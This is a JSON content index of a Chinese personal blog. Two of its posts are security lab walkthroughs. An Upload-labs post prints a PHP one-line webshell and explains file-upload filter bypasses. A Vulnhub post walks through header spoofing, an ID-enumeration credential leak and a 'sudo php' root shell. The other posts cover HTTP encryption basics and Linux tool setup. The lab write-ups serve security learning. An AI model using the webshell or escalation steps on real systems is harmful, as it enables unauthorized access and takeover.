{"meta":{"title":"4CH4N ZKUAN","subtitle":"Keep Your Enthusiasm","description":"","author":"zkuan","url":"https://whoiszkuan.github.io","root":"/"},"pages":[{"title":"404","date":"2021-08-10T14:46:38.000Z","updated":"2021-08-10T14:47:46.367Z","comments":true,"path":"404/index.html","permalink":"https://whoiszkuan.github.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2021-08-10T14:37:27.000Z","updated":"2021-08-10T16:53:41.463Z","comments":true,"path":"about/index.html","permalink":"https://whoiszkuan.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-08-10T15:08:53.000Z","updated":"2021-08-10T15:09:33.727Z","comments":true,"path":"categories/index.html","permalink":"https://whoiszkuan.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-08-10T15:21:00.000Z","updated":"2021-08-10T15:21:27.431Z","comments":true,"path":"tags/index.html","permalink":"https://whoiszkuan.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Upload-labs Pass 01-06","slug":"Upload-labs-Pass-01-06","date":"2021-10-22T06:34:39.000Z","updated":"2021-10-31T05:58:48.828Z","comments":true,"path":"2021/10/22/Upload-labs-Pass-01-06/","link":"","permalink":"https://whoiszkuan.github.io/2021/10/22/Upload-labs-Pass-01-06/","excerpt":"","text":"前言 操作系统：Kali Linux 靶场环境：docker : c0ny1/upload-labs WebShell管理工具：Godzilla 抓包工具：Burpsuite Community Edition 本篇学习方向：文件上传漏洞绕过及代码审计 此笔记上传文件均以god_test.php为标准，此文件为PHP一句话小马 &lt;?php @eval($_POST[value]);?&gt; Pass-01 前台验证审计根据上传文件god_test.php回显的拦截速度判断，上传页面为前台验证文件类型。 审计网页源代码后确定为前台JS验证： 通过onsubmit=\"return checkFile()\"调用了checkFile函数，根据： if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } 判断，如果当前文件类型不为.jpg|.php|.gif时，会弹出errMsg并返回bool值false。 有了思路以后，通过BurpSuite抓包，将bool返回值修改为true，当onsubmit事件接收结果为true时将文件上传至服务器。 注意：前台验证抓不到上传的包，因为已经被前台JS代码拦截了，所以根本没发出去包，开启Burp后开启接受Respone包，刷新页面首先抓取Request包，Forward后得到Respone包，再进行代码修改。 修改成功可成功上传php马 上传成功后出现一个元素，右键审查元素可找到php小马上传的路径，在网址栏输入对应路径，如果页面没有回显然后东西则上传成功，可用Godzilla连接WebShell。 Pass-02 Content-Type校验根据提示，服务端对数据包的MIME进行检查。 修改Content-Type类型绕过拦截。Content-Type用来标识上传的文件类型，将类型标识为服务器允许的类型即可绕过。 将Content-Type修改为image/jpeg 上传成功，得到小马地址，连接WebShell Pass-03","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://whoiszkuan.github.io/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"},{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"}]},{"title":"Vulnhub Me And My Girlfriend","slug":"Vulnhub-Me-And-My-Girlfriend","date":"2021-10-01T06:07:54.000Z","updated":"2021-10-31T05:58:28.128Z","comments":true,"path":"2021/10/01/Vulnhub-Me-And-My-Girlfriend/","link":"","permalink":"https://whoiszkuan.github.io/2021/10/01/Vulnhub-Me-And-My-Girlfriend/","excerpt":"","text":"Me And My Girlfriend:1渗透准备： 主机：Kali 2021.2 靶机：Vmware 靶机IP段：192.168.158.* Http信息头知识 Linux操作基础 靶机背景难易度：简单 靶机镜下载地址:https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/ 背景：This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, “Ceban Corp”, something has changed from Alice’s attitude towards Bob like something is “hidden”, And Bob asks for your help to get what Alice is hiding and get full access to the company! 大致意思就是男主Bob怀疑女主Alice出轨了，让我们潜入Alice公司内部查看Alice的电脑线索。 开启靶机，扫描目标主机IP段nmap -sP 192.168.158.0/24 检测出靶机IP为192.168.158.128 扫描靶机信息nmap基础用法：-A 版本检测 -O 检测OS版本 -sV 服务探测/版本信息 nmap -A -O -sV 192.168.158.128 得出靶机开放了ssh:22和http:80服务 访问80端口访问80端口发现无法正常进入网页 翻译过来意思是：只能通过本地IP访问 打开网页源代码看看有没有什么提示： 提示使用X-FORWARDED-FOR访问网页 X-Forwarded-For用来获取最初发起请求的IP 综上所述：我们需要使用X-Forwarded-For伪造一个本地IP为最初发起请求访问靶机80端口 X-Forwarded-FOR已知本地IP地址为127.0.0.1 使用X-Forwarded-For Header伪造IP 成功登录 页面有4个选项，分别为 主页、登录、注册、关于。 先随便注册一个帐号登录 Login登录进去之后对我们最有用的是Profile选项 这是一个更改密码的选项 在网址栏上发现了一点端倪 ?后面跟随的是参数page=profile&amp;user_id=12，请求了profile页面，用户id为12 尝试修改Id 可以看到回显出了其他用户的帐号和密码 如果获得了帐号和密码就可以尝试登录22端口的ssh服务 那么密码该如何获得 html中设置输入文本隐藏明文的操作为type=\"password\",在审查代码中修改type类型为type=\"text\",可查看用户输入的密码。 得出用户密码。 遍历所有用户id后锁定Bob女友Alice的账户密码为alice:4lic3 SSH访问得到Alice的账户和密码后，使用ssh访问靶机电脑 ssh alice@192.168.158.128 Flag 1列出当前文件夹所有文件，包括隐藏文件 发现文件夹下有一个隐藏文件夹 进入后发现有flag1.txt文件 成功获取flag1 Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09} 提权尝试sudo su无法提权 查看Alice当前权限 (root)NOPASSWD:/usr/bin/php发现可以不使用密码打开php文件 基础提权 尝试回调php提权 CMD=\"/bin/sh\" sudo php -r \"system('$CMD');\" 成功回调root Flag 2查找flag文件 进入/root文件夹以后，发现flag2.txt文件 成功拿下flag2 Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://whoiszkuan.github.io/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Web安全/Linux","permalink":"https://whoiszkuan.github.io/categories/Web%E5%AE%89%E5%85%A8/Linux/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"},{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"}]},{"title":"Http协议基础","slug":"Http协议基础","date":"2021-09-10T11:39:28.000Z","updated":"2021-09-10T12:17:38.278Z","comments":true,"path":"2021/09/10/Http协议基础/","link":"","permalink":"https://whoiszkuan.github.io/2021/09/10/Http%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/","excerpt":"","text":"概念服务器和客户端进行数据交互的一种形式。 常用请求头信息 User-Agent：请求载体的身份标识。 Connection：请求完毕后，是断开连接还是保持连接。 常用响应头信息 Content-Type：服务器响应回客户端的数据类型。 https协议(Hyper Text Transfer Protocol) 安全的超文本传输协议 加密方式 对称密钥加密 非对称密钥加密 证书密钥加密(https) 对称密钥加密 客户端向服务器发送一条信息，首先客户端会采用已知的算法对信息进行加密，比如MD5或者Base64加密，接收端对加密的信息进行解密的时候需要用到密钥，中间会传递密钥，（加密和解密的密钥是同一个），密钥在传输中间是被加密。 有潜在的危险，一旦被窃听，或者信息被挟持，就有可能破解密钥，而破解其中的信息。因此“共享密钥加密”这种方式存在安全隐患。 非对称密钥加密 “非对称加密”使用的时候有两把锁，一把叫做“私有密钥”，一把是“公开密钥”，使用非对象加密的加密方式的时候，服务器首先告诉客户端按照自己给定的公开密钥进行加密处理，客户端按照公开密钥加密以后，服务器接受到信息再通过自己的私有密钥进行解密。 这样做的好处就是解密的钥匙根本就不会进行传输，因此也就避免了被挟持的风险。就算公开密钥被窃听者拿到了，它也很难进行解密，因为解密过程是对离散对数求值，这可不是轻而易举就能做到的事。 缺点： 如何保证接收端向发送端发出公开秘钥的时候，发送端确保收到的是预先要发送的，而不会被挟持。只要是发送密钥，就有可能有被挟持的风险。 非对称加密的方式效率比较低，它处理起来更为复杂，通信过程中使用就有一定的效率问题而影响通信速度 证书密钥加密数字证书认证机构是客户端与服务器都可信赖的第三方机构。 传播过程： 服务器的开发者携带公开密钥，向数字证书认证机构提出公开密钥的申请，数字证书认证机构在认清申请者的身份，审核通过以后，会对开发者申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将密钥放在证书里面，绑定在一起 服务器将这份数字证书发送给客户端，因为客户端也认可证书机构，客户端可以通过数字证书中的数字签名来验证公钥的真伪，来确保服务器传过来的公开密钥是真实的。一般情况下，证书的数字签名是很难被伪造的，这取决于认证机构的公信力。一旦确认信息无误之后，客户端就会通过公钥对报文进行加密发送，服务器接收到以后用自己的私钥进行解密。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://whoiszkuan.github.io/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://whoiszkuan.github.io/tags/HTTP/"},{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"}]},{"title":"gTile-Linux应用分屏工具","slug":"gTile-Linux应用分屏工具","date":"2021-08-14T07:26:29.000Z","updated":"2021-08-18T09:06:06.503Z","comments":true,"path":"2021/08/14/gTile-Linux应用分屏工具/","link":"","permalink":"https://whoiszkuan.github.io/2021/08/14/gTile-Linux%E5%BA%94%E7%94%A8%E5%88%86%E5%B1%8F%E5%B7%A5%E5%85%B7/","excerpt":"","text":"简介这是Gnome-Shell的一个扩展插件，由于Gnome桌面的平铺方案最多只能两个窗口，对于大屏幕显示器来说是不够用的，而gTile可以解决这个问题。 gTile拥有多个内置平铺方案，可平铺多个窗口，增加工作效率。可自行配置快捷键唤醒gTile进行平铺 安装Gnome Extensions Install先安装Gnome-Shell再安装扩展 gTile-Gnome-Shell 配置打开扩展方式：Gnome Tweak Tools(优化) –&gt; Extensions(扩展) –&gt; Gtile(点击开启按钮) 点击设置按钮进入配置界面，点击(Accelerators)选项可配置快捷键，唤醒gTile的快捷键为Super+Enter。更多快捷键请自行探索。 使用方法 Super+Enter唤醒gTile 按下键盘数字键0～9使用预设方案Super+Enter+3 还有更多预设方案可多个窗口平铺 GitHub gTile:Gtile项目地址","categories":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/categories/Linux/"},{"name":"配置","slug":"Linux/配置","permalink":"https://whoiszkuan.github.io/categories/Linux/%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/tags/Linux/"},{"name":"Tools","slug":"Tools","permalink":"https://whoiszkuan.github.io/tags/Tools/"}]},{"title":"关于自己的Linux的一些配置","slug":"关于自己的Linux的一些配置","date":"2021-08-12T04:02:39.000Z","updated":"2021-08-12T07:13:12.113Z","comments":true,"path":"2021/08/12/关于自己的Linux的一些配置/","link":"","permalink":"https://whoiszkuan.github.io/2021/08/12/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84Linux%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/","excerpt":"","text":"简言由于平时比较喜欢折腾Linux，经常会把系统反复安装，许多原先配置好的东西都忘记了,所以打算写一篇来记录一下自己平时配置的文件操作。注：本人使用的Linux系统为Kali Linux rangerranger是一款命令行文件资源管理器，提供多级视图，方便操作 sudo apt install ranger 启动命令：ranger proxychainsproxychains是一款命令行代理工具，可将当前应用的TCP转发至代理，非全局代理。目前支持Tor,HTTP,Socks代理。 git clone https://github.com/rofl0r/proxychains-ngcd proxychains-ng./configuresudo make &amp;&amp; make install 代理配置文件位置：/etc/proxychains.conf启动命令：proxychains4 &lt;启动应用&gt; Vim相比Linux下的程序员都知道Vim，由于自己平时比较懒，不想学Vim的语法，所以Vim并没有自己配置，而是使用了Vim-Plus，即开即用。 git clone https://github.com/chxuan/vimplus.git ~/.vimpluscd ~/.vimplus./install.sh Vim的主题被我注释掉了，使用的主题是Terminal自带的Kali-Dark主题配色。 music-dlmusic-dl是一款基于Python3的命令行网络音乐聚合搜索下载工具。 使用pip3安装，前提需要安装pip3：sudo apt install pip3安装music-dl:sudo pip3 install pymusic-dl $ music-dl –helpUsage: music-dl [OPTIONS] Search and download music from netease, qq, kugou, baidu and xiami. Example: music-dl -k “周杰伦” Options: –version Show the version and exit. -k, –keyword TEXT 搜索关键字，歌名和歌手同时输入可以提高匹配（如 空帆船 朴树） -u, –url TEXT 通过指定的歌曲URL下载音乐 -p, –playlist TEXT 通过指定的歌单URL下载音乐 -s, –source TEXT Supported music source: qq netease kugou baidu -n, –number INTEGER Number of search results -o, –outdir TEXT Output directory -x, –proxy TEXT Proxy (e.g. http://127.0.0.1:1087) -v, –verbose Verbose mode –lyrics 同时下载歌词 –cover 同时下载封面 –nomerge 不对搜索结果列表排序和去重 –help Show this message and exit.","categories":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/categories/Linux/"},{"name":"配置","slug":"Linux/配置","permalink":"https://whoiszkuan.github.io/categories/Linux/%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/tags/Linux/"}]}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://whoiszkuan.github.io/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Web安全/Linux","permalink":"https://whoiszkuan.github.io/categories/Web%E5%AE%89%E5%85%A8/Linux/"},{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/categories/Linux/"},{"name":"配置","slug":"Linux/配置","permalink":"https://whoiszkuan.github.io/categories/Linux/%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"},{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"},{"name":"HTTP","slug":"HTTP","permalink":"https://whoiszkuan.github.io/tags/HTTP/"},{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/tags/Linux/"},{"name":"Tools","slug":"Tools","permalink":"https://whoiszkuan.github.io/tags/Tools/"}]}